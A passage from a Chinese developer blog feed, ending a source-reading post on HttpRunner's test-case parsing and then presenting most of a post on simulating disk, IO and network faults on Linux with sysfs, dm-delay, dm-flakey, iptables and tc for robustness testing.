class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">__init__</span><span class="params">(self, function_meta, functions_mapping=None, check_variables_set=None)</span>:</span></span><br><span class="line">    <span class="string">""" init LazyFunction object with function_meta</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">    Args:</span></span><br><span class="line"><span class="string">        function_meta (dict): function name, args and kwargs.</span></span><br><span class="line"><span class="string">            &#123;</span></span><br><span class="line"><span class="string">                "func_name": "func",</span></span><br><span class="line"><span class="string">                "args": [1, 2]</span></span><br><span class="line"><span class="string">                "kwargs": &#123;"a": 3, "b": 4&#125;</span></span><br><span class="line"><span class="string">            &#125;</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">    """</span></span><br><span class="line">    self.functions_mapping = functions_mapping <span class="keyword">or</span> &#123;&#125;</span><br><span class="line">    self.check_variables_set = check_variables_set <span class="keyword">or</span> set()</span><br><span class="line">    self.cache_key = <span class="keyword">None</span></span><br><span class="line">    self.__parse(function_meta)</span><br></pre></td></tr></table></figure><p>重点在最后一个行，<code>self.__parse(function_meta)</code>：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">__parse</span><span class="params">(self, function_meta)</span>:</span></span><br><span class="line">    <span class="string">""" init func as lazy functon instance</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">    Args:</span></span><br><span class="line"><span class="string">        function_meta (dict): function meta including name, args and kwargs</span></span><br><span class="line"><span class="string">    """</span></span><br><span class="line">    self._func = get_mapping_function(</span><br><span class="line">        function_meta[<span class="string">"func_name"</span>],</span><br><span class="line">        self.functions_mapping</span><br><span class="line">    )</span><br><span class="line">    self.func_name = self._func.__name__</span><br><span class="line">    self._args = prepare_lazy_data(</span><br><span class="line">        function_meta.get(<span class="string">"args"</span>, []),</span><br><span class="line">        self.functions_mapping,</span><br><span class="line">        self.check_variables_set</span><br><span class="line">    )</span><br><span class="line">    self._kwargs = prepare_lazy_data(</span><br><span class="line">        function_meta.get(<span class="string">"kwargs"</span>, &#123;&#125;),</span><br><span class="line">        self.functions_mapping,</span><br><span class="line">        self.check_variables_set</span><br><span class="line">    )</span><br><span class="line"></span><br><span class="line">    ...</span><br></pre></td></tr></table></figure><p>在这里找到了我们一直想找的 <code>self._func</code> 定义，看函数名是通过 <code>func_name</code> 从一个 map 中返回真正的函数，来看看是不是这样：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">get_mapping_function</span><span class="params">(function_name, functions_mapping)</span>:</span></span><br><span class="line">    </span><br><span class="line">    ...</span><br><span class="line"></span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        <span class="comment"># check if HttpRunner builtin functions</span></span><br><span class="line">        <span class="keyword">from</span> httprunner <span class="keyword">import</span> loader</span><br><span class="line">        built_in_functions = loader.load_builtin_functions()</span><br><span class="line">        <span class="keyword">return</span> built_in_functions[function_name]</span><br><span class="line">    <span class="keyword">except</span> KeyError:</span><br><span class="line">        <span class="keyword">pass</span></span><br><span class="line">    ...</span><br></pre></td></tr></table></figure><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> httprunner <span class="keyword">import</span> built_in, exceptions, logger, parser, utils, validator</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">load_builtin_functions</span><span class="params">()</span>:</span></span><br><span class="line">    <span class="string">""" load built_in module functions</span></span><br><span class="line"><span class="string">    """</span></span><br><span class="line">    <span class="keyword">return</span> load_module_functions(built_in)</span><br></pre></td></tr></table></figure><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">load_module_functions</span><span class="params">(module)</span>:</span></span><br><span class="line">    module_functions = &#123;&#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span> name, item <span class="keyword">in</span> vars(module).items():</span><br><span class="line">        <span class="keyword">if</span> validator.is_function(item):</span><br><span class="line">            module_functions[name] = item</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> module_functions</span><br></pre></td></tr></table></figure><p>一路追下来，具体的实现应该在 <code>built_in.py</code> 没跑：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">equals</span><span class="params">(check_value, expect_value)</span>:</span></span><br><span class="line">    <span class="keyword">assert</span> check_value == expect_value</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">less_than</span><span class="params">(check_value, expect_value)</span>:</span></span><br><span class="line">    <span class="keyword">assert</span> check_value &lt; expect_value</span><br><span class="line"></span><br><span class="line">...</span><br></pre></td></tr></table></figure><p>Ok，到这里我们终于了解了用例的解析工作做了什么，同时也解答了我们上面遗留下来的疑问，结果校验执行的是什么。</p><h2 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h2><p>在公司内部同样有着测试框架，是基于 Robot Framework 进行开发的，但是我被 Robot 的代码量劝退了。。。httprunner 项目整体来看代码量不大，很适合作为初步了解自动化测试的框架来阅读。</p><p>根据作者自述，项目起源于大疆内部的测试需求，之后转为开源项目，不知道作者现在是否是因为离开了大疆还是其他原因，现在 httprunner 的社区感觉很差，明明是有公司使用的，但是并没有积极参与，作者一个人承担了几乎100% 的代码开发任务，感觉是一个不健康的社区。</p><p>希望自己有机会的话也参与进去，不希望这样一个项目 <code>死</code> 掉。</p><h2 id="P-S"><a href="#P-S" class="headerlink" title="P.S."></a>P.S.</h2><p>其实这篇博客应该是在周五晚上完成的，但是写着写着发现自己对于项目中的整体流程无法理顺，今天又用了大半天的时间重新读了代码，一点一点记录下来。</p><p>嗯，写博客的好处之一。</p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h2 id=&quot;背景&quot;&gt;&lt;a href=&quot;#背景&quot; class=&quot;headerlink&quot; title=&quot;背景&quot;&gt;&lt;/a&gt;背景&lt;/h2&gt;&lt;p&gt;最近工作上每天疲于应付各种事情，周末实在不想继续做工作相关的事情，想起一直想了解的自动化测试框架 &lt;a href=&quot;https://gith
      
    
    </summary>
    
    
      <category term="Python" scheme="https://zdyxry.github.io/tags/Python/"/>
    
  </entry>
  
  <entry>
    <title>Linux 下常用故障模拟方法</title>
    <link href="https://zdyxry.github.io/2019/08/31/Linux-%E4%B8%8B%E5%B8%B8%E7%94%A8%E6%95%85%E9%9A%9C%E6%A8%A1%E6%8B%9F%E6%96%B9%E5%BC%8F/"/>
    <id>https://zdyxry.github.io/2019/08/31/Linux-下常用故障模拟方式/</id>
    <published>2019-08-30T23:47:00.000Z</published>
    <updated>2019-08-31T03:22:31.320Z</updated>
    
    <content type="html"><![CDATA[<h2 id="背景"><a href="#背景" class="headerlink" title="背景"></a>背景</h2><p>在日常开发时，有时候需要保证自己代码的健壮性，需要模拟各种故障测试，比如：磁盘、网络、端口等，今天来汇总一下平时使用最多的几种故障模拟方法</p><h2 id="磁盘"><a href="#磁盘" class="headerlink" title="磁盘"></a>磁盘</h2><h3 id="插入拔出"><a href="#插入拔出" class="headerlink" title="插入拔出"></a>插入拔出</h3><p>服务器的存储控制器如果是直通模式，那么在 OS 中能够直接获取到磁盘插入与拔出事件，有时候我们需要检测到相应的事件来自动化的做某些动作，具体的实现方式见之前的文章 <a href="https://zdyxry.github.io/2019/08/02/Linux-%E4%B8%8B%E7%A3%81%E7%9B%98%E8%AE%BE%E5%A4%87%E8%87%AA%E5%8A%A8%E5%8F%91%E7%8E%B0%E6%96%B9%E5%BC%8F/">Linux 下磁盘设备自动发现方式</a> 。</p><p>那么我们写完了代码想要测试，不想去机房物理操作，怎么模拟呢？</p><h4 id="Hypervisor"><a href="#Hypervisor" class="headerlink" title="Hypervisor"></a>Hypervisor</h4><p>如果你的代码部署的机器是一台虚拟机，那么在 Hypervisor 层面一般都会有对应的接口来完成相应的操作。</p><p>比如 Vsphere ESXi 中可以直接编辑虚拟机，在磁盘选项中有一个“移除”按钮，可以直接移除磁盘：</p><img src="/2019/08/31/Linux-下常用故障模拟方式/vsphere.png" title="vsphere"><p>再比如 KVM 下，可以通过 Libvirt 接口来 <a href="https://access.redhat.com/documentation/en-us/red_hat_enterprise_linux/6/html/virtualization_administration_guide/sect-managing_guest_virtual_machines_with_virsh-attaching_and_updating_a_device_with_virsh" target="_blank" rel="noopener">detach 磁盘</a>。</p><p>当然对于插入动作，Hypervisor 也会提供对应的功能。</p><h4 id="物理服务器"><a href="#物理服务器" class="headerlink" title="物理服务器"></a>物理服务器</h4><p>如果 OS 不是在 Hypervisor 上，而是直接安装在了物理服务器上，我们怎么做呢？</p><p>通常我们服务器上的磁盘都是 SCSI 设备，会实现完整的 SCSI（接口），可以通过修改相应设备的标置文件来达到目的。</p><p>示例：<br>节点存在设备 <code>/dev/sda</code> ，修改标置文件，在系统中会发现磁盘已经被移除了。</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line">[root@yiran ~]<span class="comment"># lsblk</span></span><br><span class="line">NAME            MAJ:MIN RM  SIZE RO TYPE MOUNTPOINT</span><br><span class="line">sda               8:0    0   10G  0 disk</span><br><span class="line">sr0              11:0    1  4.3G  0 rom  /run/media/root/CentOS 7 x86_64</span><br><span class="line">vda             252:0    0  100G  0 disk</span><br><span class="line">├─vda1          252:1    0    1G  0 part /boot</span><br><span class="line">└─vda2          252:2    0   99G  0 part</span><br><span class="line">  ├─centos-root 253:0    0   50G  0 lvm  /</span><br><span class="line">  ├─centos-swap 253:1    0  3.9G  0 lvm</span><br><span class="line">  └─centos-home 253:2    0 45.1G  0 lvm  /home</span><br><span class="line">[root@yiran ~]<span class="comment"># ls /sys/block/sda/device/delete</span></span><br><span class="line">/sys/block/sda/device/delete</span><br><span class="line">[root@yiran ~]<span class="comment"># echo 1 &gt; /sys/block/sda/device/delete</span></span><br><span class="line">[root@yiran ~]<span class="comment"># lsblk</span></span><br><span class="line">NAME            MAJ:MIN RM  SIZE RO TYPE MOUNTPOINT</span><br><span class="line">sr0              11:0    1  4.3G  0 rom  /run/media/root/CentOS 7 x86_64</span><br><span class="line">vda             252:0    0  100G  0 disk</span><br><span class="line">├─vda1          252:1    0    1G  0 part /boot</span><br><span class="line">└─vda2          252:2    0   99G  0 part</span><br><span class="line">  ├─centos-root 253:0    0   50G  0 lvm  /</span><br><span class="line">  ├─centos-swap 253:1    0  3.9G  0 lvm</span><br><span class="line">  └─centos-home 253:2    0 45.1G  0 lvm  /home</span><br></pre></td></tr></table></figure><p>如果我们新开一个终端，可以通过 <code>udevadm</code> 命令查看到设备移除过程：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line">[root@yiran ~]<span class="comment"># udevadm monitor</span></span><br><span class="line">monitor will <span class="built_in">print</span> the received events <span class="keyword">for</span>:</span><br><span class="line">UDEV - the event <span class="built_in">which</span> udev sends out after rule processing</span><br><span class="line">KERNEL - the kernel uevent</span><br><span class="line"></span><br><span class="line">KERNEL[1255.635671] remove   /devices/pci0000:00/0000:00:07.0/virtio3/host2/target2:0:0/2:0:0:0/bsg/2:0:0:0 (bsg)</span><br><span class="line">KERNEL[1255.636247] remove   /devices/pci0000:00/0000:00:07.0/virtio3/host2/target2:0:0/2:0:0:0/scsi_generic/sg1 (scsi_generic)</span><br><span class="line">KERNEL[1255.636265] remove   /devices/pci0000:00/0000:00:07.0/virtio3/host2/target2:0:0/2:0:0:0/scsi_device/2:0:0:0 (scsi_device)</span><br><span class="line">KERNEL[1255.636357] remove   /devices/pci0000:00/0000:00:07.0/virtio3/host2/target2:0:0/2:0:0:0/scsi_disk/2:0:0:0 (scsi_disk)</span><br><span class="line">UDEV  [1255.637109] remove   /devices/pci0000:00/0000:00:07.0/virtio3/host2/target2:0:0/2:0:0:0/bsg/2:0:0:0 (bsg)</span><br><span class="line">KERNEL[1255.638351] remove   /devices/virtual/bdi/8:0 (bdi)</span><br><span class="line">UDEV  [1255.638369] remove   /devices/pci0000:00/0000:00:07.0/virtio3/host2/target2:0:0/2:0:0:0/scsi_device/2:0:0:0 (scsi_device)</span><br><span class="line">KERNEL[1255.638385] remove   /devices/pci0000:00/0000:00:07.0/virtio3/host2/target2:0:0/2:0:0:0/block/sda (block)</span><br><span class="line">UDEV  [1255.638397] remove   /devices/pci0000:00/0000:00:07.0/virtio3/host2/target2:0:0/2:0:0:0/scsi_disk/2:0:0:0 (scsi_disk)</span><br><span class="line">KERNEL[1255.638417] remove   /devices/pci0000:00/0000:00:07.0/virtio3/host2/target2:0:0/2:0:0:0 (scsi)</span><br><span class="line">UDEV  [1255.639174] remove   /devices/pci0000:00/0000:00:07.0/virtio3/host2/target2:0:0/2:0:0:0/scsi_generic/sg1 (scsi_generic)</span><br><span class="line">UDEV  [1255.639192] remove   /devices/virtual/bdi/8:0 (bdi)</span><br><span class="line">UDEV  [1255.641850] remove   /devices/pci0000:00/0000:00:07.0/virtio3/host2/target2:0:0/2:0:0:0/block/sda (block)</span><br><span class="line">UDEV  [1255.642914] remove   /devices/pci0000:00/0000:00:07.0/virtio3/host2/target2:0:0/2:0:0:0 (scsi)</span><br><span class="line">KERNEL[1255.643143] remove   /devices/pci0000:00/0000:00:07.0/virtio3/host2/target2:0:0 (scsi)</span><br><span class="line">UDEV  [1255.643608] remove   /devices/pci0000:00/0000:00:07.0/virtio3/host2/target2:0:0 (scsi)</span><br></pre></td></tr></table></figure><p>说完了拔出磁盘，那么该如何插入呢？最简单的办法肯定是重启 OS，毕竟我们不是真正的拔出了设备，重启 OS 之后设备肯定会重新发现。我们也可以通过修改对应的标置文件来手动重新执行设备扫描动作：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line">[root@yiran ~]<span class="comment"># lsblk</span></span><br><span class="line">NAME            MAJ:MIN RM  SIZE RO TYPE MOUNTPOINT</span><br><span class="line">sr0              11:0    1  4.3G  0 rom  /run/media/root/CentOS 7 x86_64</span><br><span class="line">vda             252:0    0  100G  0 disk</span><br><span class="line">├─vda1          252:1    0    1G  0 part /boot</span><br><span class="line">└─vda2          252:2    0   99G  0 part</span><br><span class="line">  ├─centos-root 253:0    0   50G  0 lvm  /</span><br><span class="line">  ├─centos-swap 253:1    0  3.9G  0 lvm</span><br><span class="line">  └─centos-home 253:2    0 45.1G  0 lvm  /home</span><br><span class="line">[root@yiran ~]<span class="comment"># for i in `ls /sys/class/scsi_host/`;do echo "- - -" &gt; /sys/class/scsi_host/$i/scan;done</span></span><br><span class="line">[root@yiran ~]<span class="comment"># lsblk</span></span><br><span class="line">NAME            MAJ:MIN RM  SIZE RO TYPE MOUNTPOINT</span><br><span class="line">sda               8:0    0   10G  0 disk</span><br><span class="line">sr0              11:0    1  4.3G  0 rom  /run/media/root/CentOS 7 x86_64</span><br><span class="line">vda             252:0    0  100G  0 disk</span><br><span class="line">├─vda1          252:1    0    1G  0 part /boot</span><br><span class="line">└─vda2          252:2    0   99G  0 part</span><br><span class="line">  ├─centos-root 253:0    0   50G  0 lvm  /</span><br><span class="line">  ├─centos-swap 253:1    0  3.9G  0 lvm</span><br><span class="line">  └─centos-home 253:2    0 45.1G  0 lvm  /home</span><br></pre></td></tr></table></figure><p>同样，在另一个终端可以看到 udev 事件：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line">[root@yiran ~]<span class="comment"># udevadm monitor</span></span><br><span class="line">monitor will <span class="built_in">print</span> the received events <span class="keyword">for</span>:</span><br><span class="line">UDEV - the event <span class="built_in">which</span> udev sends out after rule processing</span><br><span class="line">KERNEL - the kernel uevent</span><br><span class="line"></span><br><span class="line">KERNEL[1506.675351] add      /devices/pci0000:00/0000:00:07.0/virtio3/host2/target2:0:0 (scsi)</span><br><span class="line">KERNEL[1506.675416] add      /devices/pci0000:00/0000:00:07.0/virtio3/host2/target2:0:0/2:0:0:0 (scsi)</span><br><span class="line">KERNEL[1506.675523] add      /devices/pci0000:00/0000:00:07.0/virtio3/host2/target2:0:0/2:0:0:0/scsi_disk/2:0:0:0 (scsi_disk)</span><br><span class="line">KERNEL[1506.675562] add      /devices/pci0000:00/0000:00:07.0/virtio3/host2/target2:0:0/2:0:0:0/scsi_device/2:0:0:0 (scsi_device)</span><br><span class="line">KERNEL[1506.676417] add      /devices/pci0000:00/0000:00:07.0/virtio3/host2/target2:0:0/2:0:0:0/scsi_generic/sg1 (scsi_generic)</span><br><span class="line">KERNEL[1506.676555] add      /devices/pci0000:00/0000:00:07.0/virtio3/host2/target2:0:0/2:0:0:0/bsg/2:0:0:0 (bsg)</span><br><span class="line">UDEV  [1506.677524] add      /devices/pci0000:00/0000:00:07.0/virtio3/host2/target2:0:0 (scsi)</span><br><span class="line">KERNEL[1506.677662] add      /devices/virtual/bdi/8:0 (bdi)</span><br><span class="line">UDEV  [1506.682939] add      /devices/virtual/bdi/8:0 (bdi)</span><br><span class="line">KERNEL[1506.682968] add      /devices/pci0000:00/0000:00:07.0/virtio3/host2/target2:0:0/2:0:0:0/block/sda (block)</span><br><span class="line">UDEV  [1506.683015] add      /devices/pci0000:00/0000:00:07.0/virtio3/host2/target2:0:0/2:0:0:0 (scsi)</span><br><span class="line">UDEV  [1506.683036] add      /devices/pci0000:00/0000:00:07.0/virtio3/host2/target2:0:0/2:0:0:0/scsi_disk/2:0:0:0 (scsi_disk)</span><br><span class="line">UDEV  [1506.683053] add      /devices/pci0000:00/0000:00:07.0/virtio3/host2/target2:0:0/2:0:0:0/scsi_device/2:0:0:0 (scsi_device)</span><br><span class="line">UDEV  [1506.689442] add      /devices/pci0000:00/0000:00:07.0/virtio3/host2/target2:0:0/2:0:0:0/scsi_generic/sg1 (scsi_generic)</span><br><span class="line">UDEV  [1506.690861] add      /devices/pci0000:00/0000:00:07.0/virtio3/host2/target2:0:0/2:0:0:0/bsg/2:0:0:0 (bsg)</span><br><span class="line">UDEV  [1506.711146] add      /devices/pci0000:00/0000:00:07.0/virtio3/host2/target2:0:0/2:0:0:0/block/sda (block)</span><br></pre></td></tr></table></figure><h3 id="延迟"><a href="#延迟" class="headerlink" title="延迟"></a>延迟</h3><p>为了测试软件在高 IO 延迟下的表现，现在我们需要给一块磁盘设置指定的 IO 延迟（latency），可以使用 dm-delay 来实现：</p><p>dm-delay具体参数为：<code>&lt;device&gt; &lt;offset&gt; &lt;delay&gt; [&lt;write_device&gt; &lt;write_offset&gt; &lt;write_delay&gt;]</code></p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">[root@node90 10:45:54 ~]<span class="variable">$modprobe</span> brd rd_nr=1 rd_size=10485760 <span class="comment"># 创建10G ram disk</span></span><br><span class="line">[root@node90 10:46:23 ~]<span class="variable">$blockdev</span> --getsize /dev/ram0</span><br><span class="line">20971520 </span><br><span class="line">[root@node90 10:46:23 ~]<span class="variable">$size</span>=$(blockdev --getsize /dev/ram0) <span class="comment"># Size in 512-bytes sectors</span></span><br><span class="line">[root@node90 10:46:23 ~]<span class="variable">$echo</span> <span class="string">"0 <span class="variable">$size</span> delay /dev/ram0 0 500"</span> | dmsetup create delayed <span class="comment"># 设置读延迟 500</span></span><br></pre></td></tr></table></figure><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">[root@node90 10:45:54 ~]cat fio.conf</span><br><span class="line">[random]</span><br><span class="line">filename=/dev/dm-0</span><br><span class="line">readwrite=randread</span><br><span class="line">blocksize=4k</span><br><span class="line">ioengine=sync</span><br><span class="line">direct=1</span><br><span class="line">time_based=1</span><br><span class="line">runtime=10</span><br><span class="line">[root@node90 10:45:54 ~]fio fio.conf</span><br><span class="line">...</span><br><span class="line">clat (usec): min=500769, max=502110, avg=501122.35, stdev=357.23 <span class="comment">#写入延迟 500ms </span></span><br><span class="line">     lat (usec): min=500770, max=502111, avg=501123.45, stdev=357.20 </span><br><span class="line">...</span><br></pre></td></tr></table></figure><p>通过 dm-delay，我们可以来进行各种排列组合来模拟磁盘状态，如：读延迟高，写延迟正常；读延迟高，写延迟高；读延迟低，写延迟高等。</p><h3 id="IO-中断"><a href="#IO-中断" class="headerlink" title="IO 中断"></a>IO 中断</h3><p>dm-delay 支持设置 IO 中断，具体命令为：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">$ sudo dmsetup suspend /dev/dm-0</span><br><span class="line">$ sudo dmsetup resume  /dev/dm-0</span><br></pre></td></tr></table></figure><p>若在执行 fio 过程中设置 IO 中断， 会看到 iops 为0 的现象：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">[root@node90 10:45:54 ~]fio fio.conf</span><br><span class="line">Starting 1 process</span><br><span class="line">Jobs: 1 (f=1): [r(1)] [0.0% <span class="keyword">done</span>] [0KB/0KB/0KB /s] [0/0/0 iops] [eta 34d:09h:15m:48s]</span><br></pre></td></tr></table></figure><h3 id="IO-Error"><a href="#IO-Error" class="headerlink" title="IO Error"></a>IO Error</h3><p>有时我们也要求验证磁盘突然出现 IO Error 情况，可以通过 <a href="https://www.kernel.org/doc/Documentation/device-mapper/dm-flakey.txt" target="_blank" rel="noopener">dm-flakey</a> 实现：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">[root@node90 11:06:44 ~]<span class="variable">$modprobe</span> brd rd_nr=1 rd_size=10485760 <span class="comment">#10G</span></span><br><span class="line">[root@node90 11:06:58 ~]<span class="variable">$size</span>=$(blockdev --getsize /dev/ram0)</span><br><span class="line">[root@node90 11:06:58 ~]<span class="variable">$echo</span> <span class="string">"0 <span class="variable">$size</span> flakey /dev/ram0 0 60 0"</span> | dmsetup create flakey</span><br><span class="line">[root@node90 11:06:59 ~]<span class="variable">$size</span>=$(blockdev --getsize /dev/ram0)</span><br><span class="line">[root@node90 11:07:06 ~]<span class="variable">$echo</span> <span class="string">"0 <span class="variable">$size</span> flakey /dev/ram0 0 30 30"</span>  | dmsetup reload flakey</span><br><span class="line">[root@node90 11:07:06 ~]<span class="variable">$dmsetup</span> resume flakey</span><br><span class="line">[root@node90 11:07:06 ~]<span class="variable">$dmsetup</span> table flakey</span><br><span class="line">0 20971520 flakey 1:0 0 30 30 0</span><br></pre></td></tr></table></figure><p>若在执行 fio 过程中设置 IO Error，则会看到以下错误：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">[root@node90 10:45:54 ~]fio fio.conf</span><br><span class="line">Starting 1 process</span><br><span class="line">fio: io_u error on file /dev/dm-0: Input/output error: <span class="built_in">read</span> offset=647606272, buflen=4096</span><br><span class="line">fio: pid=24184, err=5/file:io_u.c:1708, func=io_u error, error=Input/output error</span><br><span class="line"></span><br><span class="line">random: (groupid=0, <span class="built_in">jobs</span>=1): err= 5 (file:io_u.c:1708, func=io_u error, error=Input/output error): pid=24184: Sat Aug 31 11:09:45 2019</span><br><span class="line">  cpu          : usr=0.00%, sys=0.00%, ctx=0, majf=0, minf=69</span><br><span class="line">...</span><br></pre></td></tr></table></figure><h2 id="网络"><a href="#网络" class="headerlink" title="网络"></a>网络</h2><p>在故障场景中，最常见的应该就是网络故障，尤其是现在分布式应用的场景很多，另一点原因是网络相关的工具很多，可以很方便的使用。</p><h3 id="故障"><a href="#故障" class="headerlink" title="故障"></a>故障</h3><p>最简单的网络故障应该就是连接中断，也就是各个节点之间无法联通了，我们可以直接通过 <code>ifdown &lt;nic name&gt;</code> 来将网卡置为 down，或者如果不在意其他网卡状态的话，可以直接 <code>systemctl stop network</code> 停止网络服务，来模拟无法联通情况。</p><p>有时候我们不想模拟网卡故障，想要模拟固定节点之间的网络故障，那么可以通过 iptables 来实现：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">iptables -I INPUT -s 172.11.30.14 -j DROP</span><br><span class="line">iptables -I OUTPUT -d 172.11.30.14 -j DROP</span><br></pre></td></tr></table></figure><p>将指定 IP 的所有连接都丢弃。</p><h3 id="延迟-1"><a href="#延迟-1" class="headerlink" title="延迟"></a>延迟</h3><p>网络延迟模拟可以通过 <code>tc</code> 来实现，命令很简单，找到指定的网卡名称，并执行：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">[root@yiran ~]<span class="comment"># tc qdisc add dev eth0 root netem delay 8ms</span></span><br></pre></td></tr></table></figure><p>新开终端，在其他节点 ping 设置了网络延迟的节点：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">root@yiran-30-250:~</span><br><span class="line"> $ ping 192.168.30.246</span><br><span class="line">PING 192.168.30.246 (192.168.30.246) 56(84) bytes of data.</span><br><span class="line">64 bytes from 192.168.30.246: icmp_seq=1 ttl=64 time=8.76 ms</span><br><span class="line">64 bytes from 192.168.30.246: icmp_seq=2 ttl=64 time=8.40 ms</span><br><span class="line">64 bytes from 192.168.30.246: icmp_seq=3 ttl=64 time=8.38 ms</span><br><span class="line">64 bytes from 192.168.30.246: icmp_seq=4 ttl=64 time=8.38 ms</span><br><span class="line">^C</span><br><span class="line">--- 192.168.30.246 ping statistics ---</span><br><span class="line">4 packets transmitted, 4 received, 0% packet loss, time 